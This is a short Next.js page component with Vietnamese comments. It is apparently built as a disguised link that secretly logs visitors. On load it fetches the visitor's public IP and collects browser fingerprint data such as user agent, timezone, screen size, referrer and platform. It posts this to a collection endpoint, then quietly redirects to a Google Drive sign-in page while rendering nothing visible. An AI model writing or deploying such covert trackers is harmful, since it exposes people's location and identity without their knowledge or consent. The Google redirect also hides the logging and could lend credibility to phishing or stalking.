"use client";
import { useEffect } from "react";

export default function Home() {
  useEffect(() => {
    async function sendData() {
      try {
        // Lấy IP public
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        const data = {
          ip: ipData.ip,
          userAgent: navigator.userAgent,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screenWidth: window.screen.width,
          screenHeight: window.screen.height,
          referrer: document.referrer,
          network: (navigator as any).connection?.effectiveType,
          platform: navigator.platform,
        };

        await fetch("/api/collect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
      } catch (err) {
        console.error("Send error:", err);
      } finally {
        // Redirect sau 800ms
        setTimeout(() => {
          window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fdrive.google.com%2Fdrive%2Fquota&followup=https%3A%2F%2Fdrive.google.com%2Fdrive%2Fquota&ifkv=AdBytiNhY0wt9x7S7IG4lWgyMKJOZb6L5RmcKnN08SjnnUP9C1dEefnNRbGQRheIRp5wun3U35XHqg&osid=1&passive=1209600&service=wise&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S1813591063%3A1755862011333835"
        }, 800);
      }
    }

    sendData();
  }, []);

  return <div className="hidden" />;
}
